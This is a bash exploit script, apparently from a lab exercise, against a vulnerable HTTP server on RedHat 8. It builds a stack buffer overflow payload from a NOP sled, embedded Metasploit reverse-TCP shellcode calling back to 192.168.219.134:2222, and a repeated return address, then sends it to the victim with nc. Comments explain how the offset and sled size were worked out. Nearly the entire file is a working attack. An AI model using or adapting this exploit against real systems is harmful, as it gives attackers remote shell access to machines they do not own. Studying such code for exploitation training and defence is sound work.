#!/bin/bash

# This is the exploit generated to attack the RedHat 8 machine. Due to stack address randomization,
# this will not work on RedHat 9.

# The offset was determined by submitting a msf pattern of length 1,500 to the server.
# This crashed the program, and analysis of the core file (the EIP at the time of crash)
# showed that the offset was 1033 bytes. The reverse shell code is 198 bytes, 
# so 1033 - 198 = 835. To provide a buffer so the shellcode doesn't bump against the EIP, 
# the NOP sled will be 835 - 100 = 735. 100 is divisible by 4, so the 4 byte return address 
# should be properly aligned when replicated after the shellcode.
NOP=`perl -e "print '\x90'x735"`

# linux/x86/shell_reverse_tcp - 198 bytes                                    
# https://metasploit.com/                                                    
# Encoder: x86/alpha_mixed                                                   
# VERBOSE=false, LHOST=192.168.219.134, LPORT=2222, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# AutoVerifySession=true, CMD=/bin/sh
SHC="\x89\xe1\xdb\xca\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x34\x71\x4b\x6b\x6c\x37\x6a\x43\x32\x73\x47\x33\x46\x33\x63\x5a\x37\x72\x6e\x69\x58\x61\x6e\x50\x75\x36\x68\x4d\x6d\x50\x6e\x73\x73\x69\x58\x30\x67\x4f\x58\x4d\x4d\x50\x31\x59\x34\x39\x38\x79\x70\x68\x6b\x70\x6e\x48\x4b\x6b\x4b\x36\x30\x68\x53\x32\x47\x70\x45\x58\x6c\x6e\x4c\x49\x68\x61\x6e\x50\x45\x36\x66\x30\x66\x31\x32\x73\x6f\x43\x43\x33\x4b\x39\x79\x71\x48\x4d\x4b\x30\x72\x72\x31\x78\x50\x6e\x74\x6f\x33\x43\x55\x38\x42\x48\x54\x6f\x36\x4f\x50\x62\x75\x39\x4e\x69\x6b\x53\x62\x72\x32\x73\x4d\x59\x79\x71\x38\x30\x54\x4b\x58\x4d\x4b\x30\x41\x41"

# Return to an address in the NOP sled region prior to the shell code (roughly the middle). 
# This address should give a good buffer on either side in the event we are slightly off.
# We start replicating the address after the shellcode until past where the EIP is.
ADDR=`perl -e "print '\x20\xf7\xff\xbf'x300"`

# Generate the full exploit, which is composed of 1) the NOP sled, 2) the instructions to 
# generate a reverse shell, and 3) the address to overwrite the EIP and return to.
EXPLOIT=$NOP$SHC$ADDR
EXPLOIT=$(echo -e $EXPLOIT)

# Send the payload to the server. If we are listening on port 2222 we should receive a reverse
# shell to the machine. The victim machine is at address 192.168.219.131 port 8888.
echo "GET $EXPLOIT Http/1.0" | nc 192.168.219.131 8888
